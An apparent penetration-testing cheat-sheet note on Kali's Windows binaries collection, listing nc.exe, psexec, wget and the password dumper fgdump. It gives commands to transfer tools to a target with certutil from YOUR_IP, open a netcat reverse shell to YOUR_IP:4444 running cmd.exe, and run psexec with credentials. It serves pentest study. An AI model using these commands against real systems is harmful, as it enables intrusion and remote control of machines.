---
tags: [tool, privesc, windows, binaries]
tool: "windows-binaries"
category: "Privesc"
installed: true
phase: [all]
---

# Windows Binaries Collection

## Tool Overview
Purpose: Collection of useful Windows binaries for penetration testing
Location: /usr/share/windows-binaries/

## Included Tools
- nc.exe - Netcat for Windows
- plink.exe - PuTTY link
- wget.exe - Wget for Windows
- fgdump.exe - Password dumper
- psexec.exe - PSExec tool
- Various other Windows utilities

## How to Use Them

List All Binaries:
ls -la /usr/share/windows-binaries/

Copy to Working Directory:
cp /usr/share/windows-binaries/nc.exe .

Transfer to Target:
On Kali: cd /usr/share/windows-binaries && python3 -m http.server 8000
On target: certutil -urlcache -f http://YOUR_IP:8000/nc.exe nc.exe

## Common Use Cases

Netcat Reverse Shell:
nc.exe YOUR_IP 4444 -e cmd.exe

PSExec:
psexec.exe \\\\target -u user -p pass cmd.exe

Wget Download:
wget.exe http://YOUR_IP/file.exe
